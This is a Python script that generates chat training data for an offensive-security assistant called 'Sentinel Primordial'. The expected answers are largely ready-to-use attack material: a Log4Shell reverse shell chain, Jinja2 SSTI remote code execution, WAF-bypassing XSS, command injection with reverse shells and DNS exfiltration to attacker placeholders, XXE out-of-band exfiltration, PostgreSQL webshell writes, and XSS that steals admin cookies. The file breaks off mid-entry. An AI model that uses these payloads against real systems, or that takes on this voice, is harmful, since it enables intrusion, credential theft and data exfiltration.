#!/usr/bin/env python3
"""
Generate bubble-chat training data for the Sentinel Primordial AI assistant.

The FloatingChat component sends operator messages to /chat with up to 6
message history turns. No programmatic context is injected — this is a
pure conversational interface for the operator.

Categories covered:
  1. Tool output interpretation (nmap, ffuf, nuclei, sqlmap, whatweb, nikto)
  2. Payload crafting by tech stack and vuln class
  3. Finding escalation chains (what next after initial discovery)
  4. Bug bounty strategy and triage
  5. Live hunt state analysis (operator pastes hunt context)
  6. Report writing assistance
  7. Recon methodology and workflow
  8. Multi-turn context awareness

Output: server/data/prompts/platform-chat-training.json
Run:    python3 scripts/generate-chat-training.py
"""

import json
import uuid
from pathlib import Path

ROOT = Path(__file__).parent.parent
OUT  = ROOT / "server" / "data" / "prompts" / "platform-chat-training.json"

entries = []

def e(prompt_id, category, prompt, expected_answer):
    return {
        "id": str(uuid.uuid4()),
        "prompt_id": prompt_id,
        "category": category,
        "scenario": f"Operator bubble chat — {category}",
        "visual_tags": "",
        "prompt": prompt,
        "reasoning_focus": "Conversational, actionable, markdown-formatted. Lead with the key point. Use code blocks for payloads/commands. No CMD sentinel for pure knowledge questions.",
        "expected_answer": expected_answer,
        "evaluation_criteria": "Response is concise (no essays), technically accurate, uses markdown formatting, leads with the actionable insight, no preamble like 'Sure!' or 'Great question!'",
    }


# ════════════════════════════════════════════════════════════════════════════
# 1. TOOL OUTPUT INTERPRETATION
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-T001", "tool_output_interpretation",
"""nmap scan finished on 10.10.10.5:

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp   open  http    Apache httpd 2.4.29
443/tcp  open  https   Apache httpd 2.4.29
3306/tcp open  mysql   MySQL 5.7.31
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
8443/tcp open  https   Jetty 9.4

What should I target first?""",
"""**Priority targets from this scan:**

**1. MySQL on 3306 (critical — externally exposed)**
- Try unauthenticated access: `mysql -h 10.10.10.5 -u root --password=`
- Test default creds: root/root, root/mysql, root/password
- If accessible, dump credentials and pivot

**2. Jetty on 8080/8443 (high)**
- Jetty 9.4.z-SNAPSHOT = dev build, likely debug endpoints active
- Check `/status`, `/dump`, `/jmx`, `/__admin` — Jetty console paths
- Test for default Jetty realm creds on any protected paths

**3. Apache on 80/443 (medium)**
- Apache 2.4.29 has known CVEs (mod_rewrite, mod_proxy SSRF)
- Run: `curl -I http://10.10.10.5` to check headers and confirm app
- Kick off `ffuf` on both ports in parallel

**Start with:**
```bash
mysql -h 10.10.10.5 -u root --password= 2>/dev/null && echo "OPEN"
curl -sk http://10.10.10.5:8080/dump | head -50
```"""))

entries.append(e("CH-T002", "tool_output_interpretation",
"""ffuf found these endpoints:

/admin               [Status: 302, Size: 0, Location: /admin/login]
/api/v1/users        [Status: 200, Size: 4821]
/api/v1/health       [Status: 200, Size: 42]
/api/v1/debug        [Status: 200, Size: 1337]
/backup.zip          [Status: 200, Size: 2147483]
/.git                [Status: 403, Size: 0]
/api/v1/admin        [Status: 401, Size: 89]

which of these is most valuable?""",
"""**Ranked by impact:**

**1. `/backup.zip` — download immediately**
2.1 GB accessible backup file. Source code, DB dumps, credentials. Don't wait.
```bash
wget http://target.com/backup.zip -q --show-progress
```

**2. `/api/v1/debug` — check for sensitive data**
Debug endpoints in prod often expose: stack traces, env vars, DB connection strings, internal IPs.
```bash
curl -s http://target.com/api/v1/debug | python3 -m json.tool
```

**3. `/.git` — 403 doesn't mean inaccessible**
Test direct object access even if directory listing is blocked:
```bash
curl -s http://target.com/.git/HEAD   # should return "ref: refs/heads/main"
curl -s http://target.com/.git/config
```
If those return content, use `git-dumper` to reconstruct the full repo.

**4. `/api/v1/users` — 200 with 4.8KB**
Unauthenticated user listing? Check what's returned:
```bash
curl -s http://target.com/api/v1/users | python3 -m json.tool | head -30
```

**5. `/api/v1/admin` — 401, not 403**
401 = requires auth but the endpoint exists. Attempt weak creds, JWT forgery, or auth bypass."""))

entries.append(e("CH-T003", "tool_output_interpretation",
"""nuclei finished, here's the output:

[critical] [cve-2021-44228] [http] [10.10.10.5:8080] Log4Shell - Remote Code Execution
[high] [CVE-2019-0232] [http] [10.10.10.5:80] Apache Tomcat CGI RCE
[medium] [cors-misconfiguration] [http] [10.10.10.5:80] CORS wildcard (*) detected
[medium] [x-frame-options-missing] [http] [10.10.10.5:80]
[info] [tech-detect] [http] [10.10.10.5:80] Apache, Java

how do I exploit the Log4Shell finding?""",
"""**Log4Shell exploitation on Jetty :8080:**

**Step 1 — Set up your JNDI listener**
```bash
# Option A: ysoserial-all + marshalsec (full RCE)
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8888/#Exploit"

# Option B: log4j-scan (easiest, automated)
python3 log4j-scan.py -u http://10.10.10.5:8080/ --run-all-tests
```

**Step 2 — Craft the payload**
Inject into every HTTP header — Log4j logs many by default:
```
X-Api-Version: ${jndi:ldap://YOUR_IP:1389/a}
User-Agent: ${jndi:ldap://YOUR_IP:1389/a}
X-Forwarded-For: ${jndi:ldap://YOUR_IP:1389/a}
Referer: ${jndi:ldap://YOUR_IP:1389/a}
```

**Step 3 — Verify callback (OOB confirmation)**
Use Burp Collaborator or interactsh first to confirm it calls back before attempting RCE:
```bash
# interactsh-client gives you a callback URL
interactsh-client
# then test: ${jndi:ldap://YOUR_INTERACT_URL/test}
```

**Step 4 — Full RCE payload (after OOB confirmed)**
```
${jndi:ldap://YOUR_IP:1389/Exploit}
```
Serve a class file that executes: `Runtime.exec(new String[]{"bash","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"})`

**Note:** The Apache Tomcat CGI RCE (CVE-2019-0232) on :80 is a backup path if Log4Shell doesn't fire."""))

entries.append(e("CH-T004", "tool_output_interpretation",
"""sqlmap output:

[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] Parameter: category (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: category=1 AND SLEEP(5)--
[INFO] the back-end DBMS is MySQL

I confirmed SQLi. What's the fastest path to getting data out?""",
"""**Fastest extraction path from confirmed time-based blind SQLi:**

**Step 1 — Upgrade to UNION-based if possible (100x faster)**
```bash
sqlmap -u "http://target.com/api?category=1" --technique=U --batch
```
If UNION works, extraction is near-instant. Only stay on time-based if UNION fails.

**Step 2 — Enumerate databases and tables**
```bash
sqlmap -u "http://target.com/api?category=1" \
  --dbms=mysql --batch \
  --dbs                    # list databases
```

**Step 3 — Dump the users/credentials table first**
```bash
sqlmap -u "http://target.com/api?category=1" \
  --dbms=mysql --batch \
  -D app_db -T users \
  --dump \
  --threads=10             # parallel threads speed up time-based
```

**Step 4 — Check for file read/write (escalation)**
```bash
sqlmap -u "http://target.com/api?category=1" \
  --file-read="/etc/passwd"           # test FILE privilege
  --file-write="shell.php" \
  --file-dest="/var/www/html/shell.php"  # if write allowed → RCE
```

**Time estimate:** Time-based at 10 threads takes ~30s per string char. For a 20-char password hash: ~10 minutes. Use `--technique=T --threads=10 --level=1` for speed."""))

entries.append(e("CH-T005", "tool_output_interpretation",
"""whatweb output:

https://target.com [200] Bootstrap[4.3.1], Cookies[PHPSESSID], Country[US], HTML5, HTTPServer[Apache/2.4.51], JQuery[3.4.1], PHP[7.4.3], PasswordField[password], Script, Title[Login - Target CMS], X-Powered-By[PHP/7.4.3]

What vulns should I look at based on this?""",
"""**Based on this fingerprint:**

**High priority:**

`PHP/7.4.3` — EOL since Nov 2022, many known CVEs. Check `phpinfo()` exposure at `/info.php`, `/phpinfo.php`.

`Apache/2.4.51` — Vulnerable to **CVE-2021-41773** (path traversal/RCE) and **CVE-2021-42013**:
```bash
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl "http://target.com/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"
```

`jQuery/3.4.1` — Vulnerable to prototype pollution (CVE-2019-11358). Test in browser console:
```js
$.extend(true, {}, JSON.parse('{"__proto__":{"polluted":true}}'))
Object.prototype.polluted // should be undefined — if true, vulnerable
```

**Medium priority:**

`PHPSESSID` cookie — Check flags: should be `HttpOnly; Secure; SameSite=Lax`. Missing any = attack surface.

`X-Powered-By: PHP/7.4.3` — Version disclosure. Low severity on its own but aids targeting.

**Recommended next:**
```bash
# Run nikto for quick CVE check
nikto -h https://target.com -ssl

# Check Apache path traversal
curl -s "http://target.com/cgi-bin/.%2e/.%2e/etc/passwd"
```"""))

entries.append(e("CH-T006", "tool_output_interpretation",
"""I ran nikto and got this:

+ /admin/: This might be interesting
+ /config.php.bak: PHP backup file found
+ /phpMyAdmin/: phpMyAdmin accessible
+ OSVDB-3092: /backup/: This might be interesting
+ Server: Apache/2.2.8 (outdated)
+ X-Frame-Options header is not present

most interesting finding?""",
"""**`/config.php.bak` — check this first.**

Backup PHP files are served as plaintext (Apache doesn't execute `.bak`), so credentials in the config are exposed directly:
```bash
curl -s http://target.com/config.php.bak
```
Look for: DB credentials, API keys, secret keys, SMTP passwords. If found → game over for this scope.

**`/phpMyAdmin/` — second priority.**

Direct DB access via GUI. Try:
- Default creds: `root/` (empty), `root/root`, `admin/admin`
- If login works: dump `mysql.user` table, read files via `LOAD_FILE()`, write webshells via `SELECT INTO OUTFILE`

**`/backup/` — directory listing?**
```bash
curl -s http://target.com/backup/
```
If directory listing is on, enumerate for `.sql`, `.tar.gz`, `.zip` DB dumps.

**`/admin/`** — generic but worth probing. Try default creds and check response differences between wrong username vs wrong password (user enumeration).

**Apache/2.2.8** is ancient (2008). Vulnerable to dozens of CVEs including mod_rewrite bypass and range header DoS. Low bug bounty value on its own but confirms minimal patching hygiene."""))


# ════════════════════════════════════════════════════════════════════════════
# 2. PAYLOAD CRAFTING BY TECH STACK
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-P001", "payload_crafting",
"give me SSTI payloads for a Jinja2 app (Python/Flask)",
"""**Jinja2 SSTI payloads — escalating impact:**

**Detection (safe, no side effects):**
```
{{7*7}}          → 49 (confirms evaluation)
{{7*'7'}}        → 7777777 (Jinja2-specific — distinguishes from Twig which gives 49)
```

**Read environment variables (credentials/secrets):**
```
{{config}}
{{config.items()}}
{{request.environ}}
```

**Read files:**
```
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

**RCE — execute OS commands:**
```
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# More reliable cross-version:
{%for c in [].__class__.__base__.__subclasses__()%}
{%if c.__name__=='catch_warnings'%}
{{c.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
{%endif%}{%endfor%}
```

**If filters are in place (dot notation blocked):**
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

Use `tplmap` to automate: `python3 tplmap.py -u 'http://target.com/page?name=test'`"""))

entries.append(e("CH-P002", "payload_crafting",
"what are the best XSS payloads for bypassing WAFs? the target is using Cloudflare",
"""**Cloudflare WAF XSS bypass techniques:**

**1. Case variation + encoding:**
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
```

**2. HTML entities / Unicode:**
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<svg onload=alert(1)>
```

**3. SVG vectors (often bypass content filters):**
```html
<svg><script>alert(1)</script></svg>
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

**4. Event handlers without script tags:**
```html
<img src=1 href=1 onerror="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
```

**5. JavaScript protocol:**
```html
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
```

**6. Template literal / JS context breakout:**
```javascript
${alert(1)}
';alert(1)//
\';alert(1)//
```

**7. Mutation XSS (DOM parsing differences):**
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Use `dalfox` with WAF bypass mode: `dalfox url "http://target.com/search?q=test" --waf-evasion`"""))

entries.append(e("CH-P003", "payload_crafting",
"I need SSRF payloads to hit the AWS metadata service. the app is using Python requests",
"""**AWS metadata SSRF payloads for Python requests backend:**

**Standard (try first):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**If basic IP is filtered — alternative representations:**
```
http://169.254.169.254/          → decimal: http://2852039166/
http://169.254.169.254/          → hex: http://0xa9fea9fe/
http://169.254.169.254/          → octal: http://025177524776/
http://[::ffff:169.254.169.254]/ → IPv6 mapped
http://169.254.169.254.nip.io/   → DNS rebinding via nip.io
```

**If scheme is filtered:**
```
dict://169.254.169.254:80/
file:///etc/passwd               (file read, not metadata)
```

**IMDSv2 (newer instances — requires PUT first):**
Python `requests` follows redirects by default, but IMDSv2 needs a PUT:
```
# First: PUT to get token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# Then: GET with token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: <TOKEN>
```
If the app only does GET-based SSRF, IMDSv2 blocks you — note this in the report as partial mitigation.

**Key endpoint to get IAM creds:**
```
/latest/meta-data/iam/security-credentials/    → lists role name
/latest/meta-data/iam/security-credentials/ROLE_NAME  → AccessKeyId + SecretAccessKey + Token
```"""))

entries.append(e("CH-P004", "payload_crafting",
"give me a list of command injection payloads for a Linux backend",
"""**Linux command injection payloads:**

**Basic confirmation (use OOB first):**
```bash
; ping -c 1 YOUR_IP
| ping -c 1 YOUR_IP
` ping -c 1 YOUR_IP `
$(ping -c 1 YOUR_IP)
&& ping -c 1 YOUR_IP
|| ping -c 1 YOUR_IP
```

**Time-based blind (no OOB available):**
```bash
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
%0asleep%205          # URL-encoded newline
```

**Exfiltration via DNS (OOB, no direct response):**
```bash
; curl http://$(whoami).YOUR_INTERACTSH_URL/
; nslookup $(cat /etc/passwd | head -1 | base64).YOUR_INTERACT_URL
```

**Direct output (if reflected):**
```bash
; id
; cat /etc/passwd
; ls /var/www/html
; env                  # environment variables, credentials
```

**Filter bypass techniques:**
```bash
# Space filters:
{ls,-la}
cat${IFS}/etc/passwd
cat</etc/passwd

# Slash filters:
echo${IFS}"Y2F0IC9ldGMvcGFzc3dk"|base64${IFS}-d|sh

# Quote insertion to break parser:
l''s -la
ca""t /etc/passwd
```

**Reverse shell (after confirmed injection):**
```bash
; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```"""))

entries.append(e("CH-P005", "payload_crafting",
"I need SQL injection payloads for a PostgreSQL backend, the parameter is in a JSON body",
"""**PostgreSQL SQLi payloads for JSON body parameters:**

**Detection — time-based (safe):**
```sql
1; SELECT pg_sleep(5)--
1' AND 1=(SELECT 1 FROM pg_sleep(5))--
1) AND 1=(SELECT 1 FROM pg_sleep(5))--
```

**UNION-based (if reflected output):**
```sql
' UNION SELECT null,null,null--              # find column count
' UNION SELECT null,version(),null--
' UNION SELECT null,current_user,null--
' UNION SELECT null,string_agg(tablename,','),null FROM pg_tables--
```

**Read files (requires superuser or pg_read_file privilege):**
```sql
' UNION SELECT null,pg_read_file('/etc/passwd'),null--
```

**Write files / RCE via COPY:**
```sql
'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/html/shell.php'--
'; CREATE TABLE cmd_output(output text);
   COPY cmd_output FROM PROGRAM 'id';
   SELECT * FROM cmd_output;--
```

**Stacked queries (if driver supports it):**
```sql
'; DROP TABLE users;--          # destructive — don't do this in bug bounty
'; CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ BEGIN PERFORM pg_sleep(0); END; $$ LANGUAGE plpgsql SECURITY DEFINER;--
```

**JSON body injection specifics:**
```json
{"id": "1; SELECT pg_sleep(5)--"}
{"id": "1' OR '1'='1"}
{"id": 1, "extra": "1; SELECT pg_sleep(5)--"}
```
Also test: array values `["1; SELECT pg_sleep(5)--"]`, nested objects, and numeric fields cast to string."""))

entries.append(e("CH-P006", "payload_crafting",
"what XXE payloads should I use? the app parses XML",
"""**XXE payloads — escalating impact:**

**1. Detection (file read):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**2. OOB exfiltration (when response doesn't reflect content):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP/evil.dtd">
  %xxe;
]>
<foo/>
```
`evil.dtd` on your server:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://YOUR_IP/?x=%data;'>">
%exfil;
```

**3. SSRF via XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

**4. PHP-specific (base64 encode to bypass filters):**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
```

**5. If external entities are blocked — XInclude:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

**6. SVG file upload → XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```
Upload as `.svg` if the app accepts image uploads and renders SVG server-side."""))


# ════════════════════════════════════════════════════════════════════════════
# 3. FINDING ESCALATION CHAINS
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-E001", "finding_escalation",
"I found a blind SSRF on a webhook URL field — the server makes outbound requests but I don't see the response. How do I escalate this?",
"""**Blind SSRF escalation path:**

**Step 1 — Confirm OOB callback (you already did this presumably)**
```bash
# Use interactsh to confirm the callback
interactsh-client
# Payload: http://YOUR_INTERACT_URL/test
```

**Step 2 — Hit AWS metadata (most impactful)**
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
If IAM creds come back in your Collaborator/interactsh HTTP log → critical.

**Step 3 — Internal service discovery**
Even without response, timing differences reveal open ports:
```python
# Fast response = port open, timeout = port closed
http://127.0.0.1:6379/   # Redis (unauthenticated = critical)
http://127.0.0.1:27017/  # MongoDB
http://127.0.0.1:9200/   # Elasticsearch
http://127.0.0.1:8500/   # Consul
http://127.0.0.1:2375/   # Docker daemon (RCE if open)
```

**Step 4 — Escalate blind to semi-blind**
Some protocols return data OOB even when HTTP response is suppressed:
```
dict://internal-service:6379/CONFIG GET *    # Redis commands
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis SSRF via gopher
```

**Step 5 — Document for report**
Even if you can only confirm OOB callback to your server, this is typically P2 (High) if metadata endpoint is reachable, P3 (Medium) if only external SSRF confirmed. Include: callback proof screenshot, affected parameter, and attempted internal targets."""))

entries.append(e("CH-E002", "finding_escalation",
"found an IDOR — I can access other users' order data by changing the order ID. How do I show maximum impact without causing harm?",
"""**IDOR impact demonstration — safe escalation:**

**Do:**
- Access 3-5 sequential order IDs near your own (e.g., your order is #10042, test #10040, #10041, #10043)
- Document what data is exposed: names, emails, addresses, last-4 of payment card, order contents
- Test cross-account access: if you have 2 test accounts, confirm Account A can read Account B's orders
- Test if you can *modify* (not just read) — change quantity, cancel order, update delivery address
- Screenshot the response showing another user's PII

**Don't:**
- Enumerate thousands of orders (mass exploitation = beyond PoC)
- Store or exfiltrate real user data beyond what's needed for the report
- Attempt to modify payment information or trigger financial actions

**Escalation checks:**
```bash
# Can you also write?
curl -X PUT http://target.com/api/orders/10041 \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"status": "cancelled"}'

# Can you access admin orders? (higher IDs or lower IDs)
curl http://target.com/api/orders/1 -H "Authorization: Bearer YOUR_TOKEN"

# Does this extend to other resources?
/api/invoices/{id}
/api/users/{id}
/api/addresses/{id}
```

**Report impact:** "Any authenticated user can read all customer orders including PII (name, email, shipping address, order history). With N orders in the system, this represents exposure of N customer records without authorization."""))

entries.append(e("CH-E003", "finding_escalation",
"I cracked a JWT HS256 secret — it was 'secret123'. What can I do with this?",
"""**JWT secret compromise — full escalation path:**

**Step 1 — Forge an admin token**
```python
import jwt
# Decode the original token first to see the structure
original = jwt.decode(token, options={"verify_signature": False})
print(original)  # e.g. {"sub": "1337", "email": "user@test.com", "role": "user"}

# Forge with elevated role
admin_payload = {"sub": "1", "email": "admin@target.com", "role": "admin", "exp": 9999999999}
forged = jwt.encode(admin_payload, "secret123", algorithm="HS256")
print(forged)
```

**Step 2 — Test the forged token**
```bash
curl -H "Authorization: Bearer FORGED_TOKEN" http://target.com/api/admin/users
curl -H "Authorization: Bearer FORGED_TOKEN" http://target.com/api/admin/settings
```

**Step 3 — Try account takeover via sub/user ID manipulation**
```python
# Forge as user ID 1 (often admin)
payload = {"sub": "1", "iat": 1000000, "exp": 9999999999}
```

**Step 4 — Test all privileged endpoints**
Use the admin token against every 403 endpoint you found earlier:
```bash
# ffuf with the forged token
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
  -H "Authorization: Bearer FORGED_TOKEN" -mc 200,201,204
```

**Impact for report:** Authentication bypass via compromised JWT secret. Full admin impersonation possible. All user data, admin functions, and privileged operations are accessible to any party who discovers the secret (e.g., via source code disclosure, git history). Severity: Critical (P1)."""))

entries.append(e("CH-E004", "finding_escalation",
"I found stored XSS in a user profile field that gets rendered in the admin panel. How do I show account takeover impact?",
"""**Stored XSS → Admin ATO — safe PoC chain:**

**Step 1 — Confirm it fires in admin context**
Simple payload to confirm execution in admin panel:
```javascript
<img src=x onerror="fetch('http://YOUR_IP/?fired='+document.cookie)">
```
If you see a hit on your server with an admin session cookie → confirmed ATO vector.

**Step 2 — Cookie exfiltration PoC (if HttpOnly is NOT set)**
```javascript
<script>
new Image().src='http://YOUR_IP/steal?c='+encodeURIComponent(document.cookie);
</script>
```

**Step 3 — If HttpOnly IS set (can't steal cookie directly)**
Show impact via action-based XSS instead:
```javascript
// Create a new admin user
<script>
fetch('/api/admin/users', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  credentials: 'include',
  body: JSON.stringify({email:'attacker@evil.com', role:'admin', password:'hacked123'})
}).then(r=>r.json()).then(d=>fetch('http://YOUR_IP/?result='+btoa(JSON.stringify(d))))
</script>

// Or extract CSRF token and perform admin action
<script>
fetch('/admin/settings').then(r=>r.text()).then(h=>{
  const token = h.match(/csrf['":\s]+([a-f0-9]{32})/i)?.[1];
  fetch('http://YOUR_IP/?token='+token);
})
</script>
```

**Step 4 — Document without actual harm**
Capture the Burp/interactsh callback showing the admin cookie or CSRF token — that's sufficient PoC. Don't actually create backdoor admin accounts on production."""))


# ════════════════════════════════════════════════════════════════════════════
# 4. BUG BOUNTY STRATEGY AND TRIAGE
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-S001", "bug_bounty_strategy",
"I have 2 hours left on this bug bounty session on a fintech API. I've done recon and found the tech stack (Node.js, PostgreSQL, JWT auth). What should I focus on?",
"""**2-hour fintech API sprint — priority order:**

**Hour 1 — Highest-yield attacks for fintech:**

**JWT attacks (15 min)**
Fintech JWTs are high-value and often misconfigured:
```bash
# Decode and inspect
echo "YOUR_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Test alg:none
python3 -c "import base64,json; h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'='); print(h)"

# Test weak secret
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt --force
```

**IDOR on financial resources (20 min)**
Fintech apps always have transaction/account/payment IDs. Try sequential enumeration on:
- `/api/transactions/{id}`
- `/api/accounts/{id}/balance`
- `/api/payments/{id}`

**Mass assignment on user update (10 min)**
PUT/PATCH to profile endpoint with extra fields: `{"role":"admin"}`, `{"balance":99999}`, `{"premium":true}`

**Hour 2 — Secondary sweep:**

**SSRF on payment webhooks or PDF generation (20 min)**
Look for: invoice generation endpoints, payment confirmation callbacks, report export.

**GraphQL introspection if present (15 min)**
```bash
curl -X POST /graphql -d '{"query":"{__schema{types{name fields{name}}}}"}'
```

**Business logic — negative amounts, currency confusion (25 min)**
Test: `{"amount": -100}`, `{"amount": 0.001}`, `{"currency": "XYZ"}` on transfer/payment endpoints."""))

entries.append(e("CH-S002", "bug_bounty_strategy",
"I keep finding P4 low severity issues. How do I find higher severity bugs?",
"""**Moving from P4 to P1/P2 — mindset shift:**

**Why you're finding P4s:**
P4s (missing headers, version disclosure, self-XSS) are easy to spot because scanners find them. Everyone finds them. To find P1/P2, you need to reason about *business logic* and *authentication/authorization boundaries*.

**High-severity hunting framework:**

**1. Follow the money / data**
Ask: *what's the most sensitive thing this app does?*
- Financial app → transactions, balances, payment methods
- SaaS → customer data, subscription management, billing
- Healthcare → patient records, prescriptions
- Focus all energy on the endpoints that touch those.

**2. Attack the auth boundary**
Every privilege boundary is a potential auth bypass:
- What happens if you access admin endpoints with a user token?
- What if you delete the auth header entirely?
- What if you use another user's token on your resources?
- What if you manipulate the user ID in the JWT claims?

**3. Chain low-severity issues**
P4 + P4 + P4 can = P1. Example:
- Version disclosure → know exact software version → find known CVE → RCE

**4. Read the scope carefully**
High-paying programs list their most sensitive assets. Hunt those specifically.

**5. Understand the codebase's era**
Legacy apps (>5 years old) → SQLi, XXE, deserialization
Modern SPAs → IDOR, auth bypass, mass assignment, race conditions
Microservices → SSRF, JWT issues, broken service-to-service auth

**Shift your approach:** spend 80% of time on manual testing of business logic, 20% on automated scanning."""))

entries.append(e("CH-S003", "bug_bounty_strategy",
"the target has a WAF (Cloudflare). Should I try to bypass it or work around it?",
"""**WAF strategy — bypass vs route around:**

**Work around it (more reliable):**

**1. Find direct-to-origin IP**
Cloudflare proxies traffic but the origin server has a real IP:
```bash
# Historical DNS — check old records before Cloudflare
curl "https://securitytrails.com/domain/target.com/history/a"
# Or: Shodan, Censys for ASN-based search

# If found, send payloads direct to origin IP with Host header:
curl -H "Host: target.com" "http://ORIGIN_IP/vuln-path"
```

**2. Subdomains that bypass WAF**
Often dev/staging/API subdomains go direct:
```bash
subfinder -d target.com | httpx -probe | grep -v cloudflare
```
Common: `staging.target.com`, `dev.target.com`, `api.target.com`, `direct.target.com`

**3. Email origination IPs**
Send a password reset email. The mail server is often on the same subnet as origin.

**Bypass Cloudflare WAF (when you must):**

- **Encoding:** URL encode twice (`%253cscript%253e`), unicode escapes
- **Case variation:** `<ScRiPt>`, mixed case event handlers
- **Chunked encoding:** split payloads across parameters
- **Nullbytes:** `java%00script:`, `%00<script>`
- **Content-Type switching:** send JSON payload as `text/plain` if WAF only inspects `application/json`

**Practical priority:** Always try to find the origin IP first — it's faster and more reliable than WAF bypass research."""))

entries.append(e("CH-S004", "bug_bounty_strategy",
"is this a real bug? I found that the app returns a different error message for valid vs invalid usernames on the login form",
"""**Yes — this is a valid finding, typically P4/P3.**

**What it is:** Username enumeration via error message differentiation.

**Impact assessment:**
- Attacker can confirm which email addresses have accounts
- Enables targeted phishing (confirmed victims are real users)
- Enables credential stuffing against known-valid accounts
- Severity increases if combined with: no rate limiting, no 2FA, weak password requirements

**Severity guidance:**
- P4 (Low): standalone, with rate limiting in place
- P3 (Medium): no rate limiting on the login endpoint
- P2 (High): if combined with known password breach data + no rate limiting → automated account takeover

**To document properly:**
1. Show the two distinct responses side-by-side:
   - Invalid username: `"User not found"`
   - Valid username + wrong password: `"Invalid password"`
2. Test for rate limiting: send 50 requests in 5 seconds, confirm no lockout/CAPTCHA
3. Note the exact response difference (body text, status code, response time, or HTTP headers)

**Remediation to include:** Return identical error messages for both cases: "Invalid username or password." Also recommend rate limiting and CAPTCHA after N failed attempts.

**Tip:** Check if the registration endpoint also leaks this info: "This email is already registered" on signup = same class of bug."""))


# ════════════════════════════════════════════════════════════════════════════
# 5. LIVE HUNT STATE ANALYSIS
# ════════════════════════════════════════════════════════════════════════════

entries.append(e("CH-H001", "live_hunt_analysis",
"""the hunt engine just found this — what does it mean?

{
  "phase": "probing",
  "iteration": 4,
  "confirmedFindings": 1,
  "pendingHypotheses": 3,
  "topHypothesis": {
    "vulnClass": "ssrf",
    "confidence": 0.82,
    "targetUrl": "https://target.com/api/webhooks",
    "reasoning": "Webhook endpoint accepts user-supplied URLs with no visible validation"
  },
  "lastTool": "nuclei",
  "lastToolResult": "no templates matched"
}""",
"""**Hunt status: active, promising.**

**What's happening:**
- Iteration 4 of probing — the engine has cycled 4 times through observe → hypothesize → probe
- 1 confirmed finding already (check `context/hunt-findings.json` to see what was confirmed)
- Currently testing the SSRF hypothesis (confidence 0.82 = strong evidence for it)
- Nuclei found nothing — not surprising for SSRF, nuclei templates mostly cover CVEs not logic issues

**The SSRF hypothesis is your best lead:**
0.82 confidence means the engine saw real signals pointing to unvalidated URL handling on the webhook endpoint. Nuclei won't catch this — it needs manual/custom probing.

**Recommended manual follow-up:**
```bash
# Test with Burp Collaborator or interactsh
